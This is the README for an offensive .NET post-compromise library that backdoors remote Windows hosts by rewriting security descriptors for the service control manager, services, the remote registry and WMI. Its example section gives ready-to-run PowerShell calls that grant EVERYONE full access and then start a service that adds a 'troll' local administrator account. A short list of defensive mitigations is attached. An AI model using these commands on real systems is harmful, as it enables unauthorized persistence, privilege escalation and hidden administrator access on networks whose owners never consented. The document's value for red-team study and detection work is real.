# SharpPersistSD
A Post-Compromise granular, fully reflective, simple and convenient .NET library to embed persistency to persistency by abusing Security Descriptors of remote machines. The techniques incorporated are not novel but I've yet to come across any documented approach of modifying SCM/Service's SDDL by directly modifying registry keys. Modification of SD for WMI and Remote registry was also added in as an after thought but this means there's a lot more to explore and add for the curious minds. 


### How is this different from https://github.com/mandiant/SharPersist?
SharPersist is focused on adding persistency on the local machine. 
SharpPersistSD is focused on backdooring the remote machine so that persistency or code execution can be established later. (i.e persistency to persistency)
Post backdooring, even a **non local admin** on the remote machine will be able to regain privileged/SYSTEM persistency/execution if using SCM or REG.


# Compiled
Refer to release.

# Compilation

1. Git clone / download project and open with visual studio
2. Rightclick the project -> add reference and add *System.Management* and add *System.Management.Instrumentation*
3. Compile as x64, Release\
\
*******No other dependencies*******

# Nomenclature
Methods are named according to **PROTOCOL_ACTION**\
so REG_ModifyRegistryPermissions\
means it uses the RemoteRegistry protocol to modify registry permissions..

# Caveats
1. The library checks the SDDL syntax but not the SDDL logic, so best to stick to example SDDL and just change the principal of the SDDL
2. As this is a Post-Compromise library, it assumes you are running with the relevant privileges and permissions already.
3. Library is focused for domain environments, but you can use it in workgroup with the relevant additional changes.
4. Modifying permissions via REG_ModifyRegistryPermissions may not show up immediately when viewing permissions through GUI. Verify it using:
```
Get-Acl -Path "HKLM:SYSTEM\<key>" | Format-List
```

# library

**REG_ModifyRegistryPermissions(string hostname, string subkey, string principal, bool propogate)**
```
- subkey: must be like "SYSTEM\<key>" or "SYSTEM\<key>\<key>"
- principal: "EVERYONE", "Domain\User", etc
- propogate: if true, will set permissions to subkeys of the key
```

**REG_ModifyRegistryContainingSD(string type, string hostname, string SDDL, string key, string value)**
```
- type: "DCOM" or "SVC" or "SCM"
- SDDL: any legitimate SDDL string such as "(A;;KA;;;WD)" or "(A;;KA;;;S-1-1-0)"
- Key: key name, if type="SVC", the key must follow the format "SYSTEM\CurrentControlSet\Services\<SERVICENAME>\Security"
- value: value name
```

**WMI_ModifyWMISD(string hostname, string SDDL)**
```
- SDDL: Change the principal component of the SDDL string such as "(A;;CCDCRP;;;WD)" or "(A;;CCDCRP;;;S-1-1-0)" 
```

**REG_CreateRegKey(string hostname, string key, string value, object data, int REG_TYPE)**
```
- data: depending on REG_TYPE, you can pass string for string, int for Dword or byte[] for Binary
- REG_TYPE: String = 1, Binary = 3, DWord = 4
```

**SCM_CreateAndStart(string hostname, string servicename, string binarypath)**
```
- servicename: service to create 
- binarypath: binarypath in the for "c:\windows\..\example.exe" or "cmd /c blah blah blah"
```

**SVC_ModifyAndStart(string hostname, string servicename, string BinaryPathName)**
```
- servicename: service to create 
- binarypath: binarypath in the for "c:\windows\..\example.exe" or "cmd /c blah blah blah"
```


# Example Usage

## SCM SD, allow everyone  - Requires Reboot for services.exe to restart!!
```
#Modify SD to allow "EVERYONE" access to service control manager
[SharpPersistSD.SecurityDescriptor]::REG_ModifyRegistryContainingSD("SCM","Hostname","(A;;KA;;;WD)","SYSTEM\CurrentControlSet\Control\ServiceGroupOrder\Security", "Security")

#Set exemption for non-admin to access services. This sets for all services, you can use REG_CreateRegKey to set for specific service.
[SharpPersistSD.SecurityDescriptor]::REG_CreateRegKey("Hostname", "SYSTEM\CurrentControlSet\Control", "RemoteAccessExemption", 1, 4)

#After reboot - You must use the provided SCM_CreateAndStart() function. sc.exe will not work to start the service.
#Create and start service
[SharpPersistSD.SecurityDescriptor]::SCM_CreateAndStart("Hostname","troll","cmd /c net users /add troll Trolololol123 && net localgroup administrators /add troll")
```
## SVC SD, allow everyone  - Requires Reboot for services.exe to restart!! 
```
#Modify SD to allow "EVERYONE" access to specific service (eg.PlugPlay)
[SharpPersistSD.SecurityDescriptor]::REG_ModifyRegistryContainingSD("SVC","Hostname","(A;;KA;;;WD)","SYSTEM\CurrentControlSet\Services\PlugPlay\Security", "Security")

#Set exemption for non-admin to access services. This sets for all services, you can use REG_CreateRegKey to set for specific service.
[SharpPersistSD.SecurityDescriptor]::REG_CreateRegKey("Hostname", "SYSTEM\CurrentControlSet\Control", "RemoteAccessExemption", 1, 4)

#After reboot - You must use the provided SVC_ModifyAndStart() function. sc.exe will not work to start the service.
#Modify and start service
[SharpPersistSD.SecurityDescriptor]::SVC_ModifyAndStart("Hostname", "troll", "cmd /c net users /add troll Trolololol123 && net localgroup administrators /add troll")
```
## REG SD, allow everyone 
```
#Modify SD to allow "EVERYONE" access to remote registry service
[SharpPersistSD.SecurityDescriptor]::REG_ModifyRegistryPermissions("Hostname","SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg","EVERYONE",$false)

#Modify key to allow write  
[SharpPersistSD.SecurityDescriptor]::REG_ModifyRegistryPermissions("Hostname","SYSTEM\CurrentControlSet\Control","EVERYONE",$true)

#Alternatively, you can set it on "SYSTEM", which lets you create services, scheduled tasks just via registry keys (eg. GhostTask)
```
## WMI SD, allow everyone 
```
#Modify SD to allow "EVERYONE" access to WMI
[SharpPersistSD.SecurityDescriptor]::WMI_ModifyWMISD("Hostname","(A;;CCWP;;;WD)") 
[SharpPersistSD.SecurityDescriptor]::REG_ModifyRegistryContainingSD("DCOM","Hostname","(A;;CCDCRP;;;WD)","software\microsoft\ole", "MachineLaunchRestriction")

#Can use any wmi tool to connect (eg. SharpWMI)
```

# Blue Team and Mitigations
1. GPO! GPO! GPO! ENFORCE VIA GPO!
2. Monitor Registry Changes for the ones mentioned ^
3. Monitor SERVICE CREATION / STOP / START
4. Firewall off unneeded protocols

# Wishlist / Upgrades - which i will not be pursuing
1. Add features for PSRemoting, ScheduledTask and yada yada
2. REG_ uses RemoteRegistry, you can incporate WMI to perform registry actions as well to make WMI_ModifyRegistryPermissions

# Disclaimer
For educational purposes only!

# Credits / References
- https://www.c-sharpcorner.com/UploadFile/puranindia/windows-management-instrumentation-in-C-Sharp/
- https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/
- https://gist.github.com/pich4ya/c15af736f0f494c1a560e6c837d77828 
- https://learn.microsoft.com/en-us/windows/win32/wmisdk/changing-access-security-on-securable-objects
- https://unlockpowershell.wordpress.com/2009/11/20/script-remote-dcom-wmi-access-for-a-domain-user/
- https://albertherd.com/2017/10/19/code-never-lies-documentation-sometimes-do/
- https://github.com/Mr-Un1k0d3r/SCShell/blob/master/SharpSCShell.cs
- https://www.experts-exchange.com/questions/27096211/VB-net-set-registry-key-remotely.html
- https://raw.githubusercontent.com/samratashok/RACE/master/RACE.ps1
- https://stackoverflow.com/questions/6851961/using-regsetkeysecurity-to-avoid-registry-redirection
- https://forums.powershell.org/t/unable-to-set-acl-on-remote-registry-kindly-help/7078/5
- https://posts.specterops.io/remote-hash-extraction-on-demand-via-host-security-descriptor-modification-2cf505ec5c40
- https://woshub.com/set-permissions-on-windows-service/
- https://support.microsoft.com/en-us/topic/block-remote-callers-who-are-not-local-administrators-from-starting-stopping-services-c5f77f8e-09e6-57e6-72d1-2c4423627a24
- https://vbscrub.com/2020/06/02/windows-createservice-api-bypasses-service-permissions/
- https://github.com/VbScrub/ServiceInstallerTest/blob/master/Program.vb
- https://stackoverflow.com/questions/2732126/deletesubkey-unauthorizedaccessexception
- https://stackoverflow.com/questions/28739477/accessing-a-remote-registry-with-local-credentials-of-the-remote-machine-on-th
- https://www.rhyous.com/2011/08/07/how-to-authenticate-and-access-the-registry-remotely-using-c/



